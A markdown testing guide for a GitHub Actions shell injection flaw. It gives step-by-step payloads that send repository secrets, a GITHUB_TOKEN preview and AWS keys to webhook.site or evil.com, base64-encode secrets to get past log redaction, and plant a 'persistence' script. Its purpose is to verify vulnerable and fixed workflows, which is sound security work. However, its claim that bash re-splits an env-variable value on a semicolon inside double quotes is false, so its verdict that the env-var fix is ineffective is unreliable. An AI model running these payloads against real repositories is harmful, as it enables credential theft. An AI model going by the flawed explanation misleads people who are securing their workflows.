# Testing Guide: Prove the Vulnerability is Real

Follow these steps to see the shell injection vulnerability in action.

---

## Prerequisites

- Access to GitHub repository with Actions enabled
- A webhook receiver (we'll use webhook.site)
- 5 minutes of your time

---

## Quick Start (3-Step Proof)

### Step 1: Get Your Webhook URL

1. Go to https://webhook.site
2. You'll automatically get a unique URL like: `https://webhook.site/abc-123-def-456`
3. Copy the unique ID part: `abc-123-def-456`
4. Keep the webhook.site tab open to see incoming requests

### Step 2: Run the Vulnerable Workflow

1. Go to your GitHub repository
2. Click **Actions** tab
3. Select **"VULNERABLE: Package Update Workflow"** from the left sidebar
4. Click **"Run workflow"** button (top right)
5. Enter these inputs:

**Package name:**
```
foo"; curl -X POST https://webhook.site/abc-123-def-456 -d "secret=$DEMO_SECRET" #
```
*Replace `abc-123-def-456` with YOUR webhook ID*

**Package version:**
```
1.0.0
```

6. Click **"Run workflow"** (green button)

### Step 3: Check Your Webhook

1. Go back to the webhook.site tab
2. Wait 10-30 seconds
3. You should see a new POST request appear

**Expected result:**
```
POST /abc-123-def-456
Content-Type: application/x-www-form-urlencoded

secret=super-secret-api-key-12345
```

**✅ If you see this:** The vulnerability is REAL. The secret was exfiltrated!

**❌ If you don't see it:** Check the workflow logs for errors, or ensure the webhook URL is correct.

---

## Detailed Testing Scenarios

### Test 1: Basic Secret Exfiltration

**Goal:** Prove that secrets can be stolen

**Payload:**
```
foo"; curl -X POST https://webhook.site/YOUR-ID -d "secret=$DEMO_SECRET" #
```

**Steps:**
1. Run vulnerable.yml with this payload
2. Check webhook.site for POST request
3. Verify request body contains: `secret=super-secret-api-key-12345`

**Success criteria:** ✅ Secret appears in webhook

---

### Test 2: GitHub Token Exfiltration

**Goal:** Prove that GITHUB_TOKEN can be stolen

**Payload:**
```
foo"; TOKEN_PREVIEW=$(echo $GITHUB_TOKEN | cut -c1-20); curl -X POST https://webhook.site/YOUR-ID -d "token_preview=$TOKEN_PREVIEW" #
```

**Steps:**
1. Run vulnerable.yml with this payload
2. Check webhook.site
3. Verify request body contains: `token_preview=ghs_...` (first 20 chars)

**Why preview only?** Full tokens might be too long for URL params, and we don't want to leak a real token.

**Success criteria:** ✅ Token preview appears in webhook

---

### Test 3: Prove Command Execution

**Goal:** Show arbitrary commands can run

**Payload:**
```
foo"; echo "====INJECTION_PROOF====" && whoami && hostname && date #
```

**Steps:**
1. Run vulnerable.yml with this payload
2. Go to the workflow run page
3. Click on the failed/completed step
4. Expand the "Create Branch" step logs

**Expected logs:**
```
====INJECTION_PROOF====
runner
fv-az123-456
Thu Nov 14 12:34:56 UTC 2025
```

**Success criteria:** ✅ Your commands executed and output appears in logs

---

### Test 4: Ineffective Fix Still Vulnerable

**Goal:** Prove environment variables don't fix the issue

**Payload:**
```
foo"; curl -X POST https://webhook.site/YOUR-ID -d "env_vars_dont_help=$DEMO_SECRET" #
```

**Steps:**
1. Run **ineffective-fix.yml** workflow (NOT vulnerable.yml)
2. Check webhook.site
3. Verify request body contains the secret

**Expected result:** The attack still works!

**Success criteria:** ✅ Secret exfiltrated even with env vars

---

### Test 5: Secure Workflow Blocks Attack

**Goal:** Prove input validation prevents the attack

**Payload:**
```
foo"; curl -X POST https://webhook.site/YOUR-ID -d "should_not_reach_here=$DEMO_SECRET" #
```

**Steps:**
1. Run **secure.yml** workflow
2. Workflow should fail at validation step
3. Check webhook.site - NO REQUEST should arrive

**Expected logs:**
```
🔍 Validating package name: foo"; curl -X POST...
❌ ERROR: Invalid package name format
   Package name: foo"; curl -X POST https://webhook.site/...
   Expected format: @scope/package-name or package-name
Error: Process completed with exit code 1.
```

**Success criteria:**
- ✅ Workflow fails at validation
- ✅ No webhook request received
- ✅ Secret NOT exfiltrated

---

### Test 6: Valid Input Still Works

**Goal:** Prove secure workflow accepts legitimate inputs

**Package name:**
```
@prefect/ui-library
```

**Package version:**
```
2.1.3
```

**Steps:**
1. Run **secure.yml** workflow
2. Workflow should complete successfully
3. Check logs for success message

**Expected logs:**
```
✅ Package name validation passed
✅ Version validation passed
✅ All input validation checks passed!
✅ Secure workflow completed successfully
📦 Package: @prefect/ui-library
🔖 Version: 2.1.3
```

**Success criteria:** ✅ Workflow succeeds with valid input

---

## Understanding the Results

### Why Does the Attack Work?

Let's trace through the execution:

**Your input:**
```
package_name: foo"; curl https://evil.com?secret=$DEMO_SECRET #
```

**GitHub Actions evaluates:**
```yaml
env:
  PACKAGE_NAME: foo"; curl https://evil.com?secret=$DEMO_SECRET #
```

**Bash receives:**
```bash
git checkout -b "update-${PACKAGE_NAME}"
```

**Bash expands to:**
```bash
git checkout -b "update-foo"; curl https://evil.com?secret=$DEMO_SECRET #"
```

**Bash parses as:**
```bash
# Command 1
git checkout -b "update-foo"

# Command 2 (injected!)
curl https://evil.com?secret=super-secret-api-key-12345

# Command 3 (commented out)
# -1.0.0"
```

**Key insight:** The shell sees two separate commands because the semicolon ends the first command.

---

## Troubleshooting

### Issue: Webhook doesn't receive request

**Possible causes:**
1. Workflow is still running (wait 30 seconds)
2. Wrong webhook URL (double-check the unique ID)
3. GitHub Actions blocked outbound network (rare)
4. Workflow failed before reaching the vulnerable step

**Debug steps:**
- Check workflow logs for the actual command executed
- Look for "curl" in the logs
- Verify your webhook.site page is still open

### Issue: Workflow fails immediately

**Possible causes:**
1. Syntax error in payload (check quotes)
2. Repository doesn't have Actions enabled
3. Insufficient permissions

**Debug steps:**
- View the workflow run logs
- Check for error messages
- Ensure Actions are enabled in repo settings

### Issue: Secret shows as `***` in logs

**Expected behavior!** GitHub redacts exact matches of secrets in logs. However:
- Secrets are NOT redacted in webhook requests
- Secrets are NOT redacted if modified (e.g., base64 encoded)
- The attack still works; you just can't see it in logs

---

## Advanced Testing

### Test 7: Bypass Log Redaction

**Payload:**
```
foo"; SECRET_B64=$(echo $DEMO_SECRET | base64); curl https://webhook.site/YOUR-ID/$SECRET_B64 #
```

**Expected:** Secret appears in webhook URL path, base64-encoded

---

### Test 8: Multiple Secrets

**Payload:**
```
foo"; curl -X POST https://webhook.site/YOUR-ID -d "secret1=$DEMO_SECRET&secret2=$DEMO_AWS_KEY" #
```

**Expected:** Both secrets exfiltrated in one request

---

### Test 9: Create Persistence

**Payload:**
```
foo"; echo "curl https://webhook.site/YOUR-ID?cron=true" > /tmp/persist.sh && chmod +x /tmp/persist.sh && /tmp/persist.sh #
```

**Expected:** Script created and executed

---

## Comparison Table

Run the same payload through all three workflows:

| Workflow | Attack Blocked? | Secret Safe? |
|----------|----------------|--------------|
| vulnerable.yml | ❌ No | ❌ Exfiltrated |
| ineffective-fix.yml | ❌ No | ❌ Exfiltrated |
| secure.yml | ✅ Yes | ✅ Protected |

---

## Real-World Impact Simulation

### Scenario: Production AWS Credentials

Imagine this workflow had access to:
```yaml
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
```

**Attack payload:**
```
foo"; curl -X POST https://webhook.site/YOUR-ID -d "aws_key=$AWS_ACCESS_KEY_ID&aws_secret=$AWS_SECRET_ACCESS_KEY" #
```

**Result:** Attacker gains full AWS access!

**Impact:**
- Spin up expensive EC2 instances (crypto mining)
- Access production databases
- Exfiltrate customer data
- Deploy backdoors
- Ransom the infrastructure

---

## Reporting Your Findings

After testing, you should see:

1. ✅ **vulnerable.yml** - Secret exfiltrated to webhook
2. ✅ **ineffective-fix.yml** - Secret still exfiltrated
3. ✅ **secure.yml** - Attack blocked, no exfiltration

**This proves:**
- The vulnerability is real and exploitable
- Moving to environment variables doesn't fix it
- Input validation is required for security

---

## Next Steps

Now that you've confirmed the vulnerability:

1. **Review your workflows** - Search for `${{ inputs.` in all workflow files
2. **Add validation** - Use regex to whitelist allowed characters
3. **Test your fixes** - Use attack payloads to verify
4. **Audit secrets** - Minimize scope and rotate regularly
5. **Monitor Actions** - Watch for suspicious workflow runs

---

## Questions?

**Q: Is this specific to GitHub Actions?**
A: No, similar injection vulnerabilities exist in GitLab CI, CircleCI, etc. Always validate untrusted input!

**Q: Can GitHub detect/prevent this?**
A: GitHub has some protections (log redaction), but can't prevent the underlying injection. Validation must happen in the workflow.

**Q: Should I be concerned?**
A: Yes, if your workflows use `workflow_dispatch` with inputs. Review and fix them!

---

## Summary

You've just proven:
- ✅ GitHub Actions workflows can be exploited via shell injection
- ✅ Environment variables don't prevent the attack
- ✅ Input validation is the proper security control

**The vulnerability is real. The fix in the remediation trajectory was ineffective. Input validation is required.**

---

## Share Your Results

Found this helpful? Share your test results:
- Take screenshots of successful exfiltration
- Show the comparison between vulnerable and secure workflows
- Educate your team about this vulnerability

**Stay secure!** 🔒
